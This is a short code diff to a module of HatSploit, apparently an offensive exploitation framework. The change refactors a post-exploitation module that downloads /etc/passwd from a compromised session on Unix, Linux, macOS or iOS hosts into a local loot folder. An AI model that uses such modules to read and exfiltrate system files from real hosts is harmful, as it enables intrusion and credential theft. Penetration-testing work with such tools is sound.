@@ -7,6 +7,7 @@
 
 from hatsploit.lib.module import Module
 from hatsploit.lib.sessions import Sessions
+from hatsploit.lib.loot import Loot
 
 
 class HatSploitModule(Module, Sessions):
@@ -29,15 +30,14 @@ class HatSploitModule(Module, Sessions):
             'Type': "session->[unix,linux,macos,apple_ios]",
             'Required': True
         },
-        'LPATH': {
-            'Description': "Local path.",
-            'Value': None,
+        'PATH': {
+            'Description': "Path to save file.",
+            'Value': Loot().specific_loot('passwd'),
             'Type': None,
             'Required': True
         }
     }
 
     def run(self):
-        session, local_path = self.parse_options(self.options)
-
-        self.session_download(session, '/etc/passwd', local_path)
+        session, path = self.parse_options(self.options)
+        self.session_download(session, '/etc/passwd', path)
